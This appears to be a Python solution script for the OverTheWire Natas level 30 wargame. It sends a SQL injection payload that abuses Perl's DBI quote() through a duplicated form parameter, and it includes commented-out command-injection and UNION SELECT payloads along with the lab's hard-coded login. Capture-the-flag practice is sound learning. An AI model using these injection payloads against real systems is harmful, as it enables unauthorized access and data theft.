#!/usr/bin/python

import requests, urllib

url = "http://natas30.natas.labs.overthewire.org/index.pl"

auth = ("natas30", "wie9iexae0Daihohv8vuu3cei9wahf0e")

# https://stackoverflow.com/questions/40273267/is-perl-function-dbh-quote-still-secure

# params = {
#     # "file": "|cat $(find /etc/ -name '*atas30' 2&>/dev/null);"
#     "file": '|cat /etc/n\\atas_webpass/n\\atas30;'
#     # "file": "|cat index.pl;"
# }
data = {
    "username": 'natas31',
    "password": '"asdf" or 1=1; #',
    # "password": '"asdf" UNION SELECT ALL password FROM users; #',
    # "password": 'NUMERIC'
}
data = urllib.parse.urlencode(data)
print(data)
# r = requests.post(url, data=data, auth=auth)
# print(r.request.body)

s = requests.Session()

r = requests.Request('POST', url, auth=auth)
# r = requests.post(url, auth=auth, )
r = r.prepare()

# r.body = 'username=natas30&password=%22+or+1%3D1%3B+%23&password=NUMERIC' 
# for i in range(15):
    # r.body = 'username=natas30&password=%22+or+1%3D1%3B+%23&password=' + str(i)
    # r.body = data + "&password=" + str(i)
r.body = data + "&password=2"

r.headers['Content-Type'] = 'application/x-www-form-urlencoded'
r.headers['Content-Length'] = len(r.body)

res = s.send(r)

if 'fail :(' in res.text:
    print('Failed')
elif 'win!' in res.text:
    print('SUCCESS')
    print(res.text)
    exit(0)
else:
    print(res.text)
    # print(res.request.body)
    # print(res.request.headers)